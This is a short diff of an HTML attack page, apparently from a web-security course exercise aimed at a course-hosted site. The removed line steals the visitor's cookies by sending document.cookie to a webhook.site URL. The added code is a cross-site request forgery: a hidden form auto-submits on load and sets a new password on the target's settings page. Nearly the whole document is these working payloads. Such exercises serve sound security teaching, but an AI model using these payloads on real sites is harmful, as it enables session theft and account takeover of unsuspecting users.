@@ -1,13 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Version 9</title>
-</head>
-<!DOCTYPE html>
-<html>
 <body>
+    <h3>Version 10</h3>
+    <form id="my-form-to-hack" action="https://cats.is-course.ru/settings" method="POST">
+        <input type="hidden" name="password" value="LegkiyParol123!" />
+        <input type="hidden" name="confirm-password" value="LegkiyParol123!" />
+
+    </form>
+
     <script>
-        new Image().src = "https://webhook.site/f274ce66-95a3-43e4-8fd0-58833dbce475?data=" + document.cookie;
+        document.getElementById('my-form-to-hack').submit();
     </script>
 </body>
 </html>
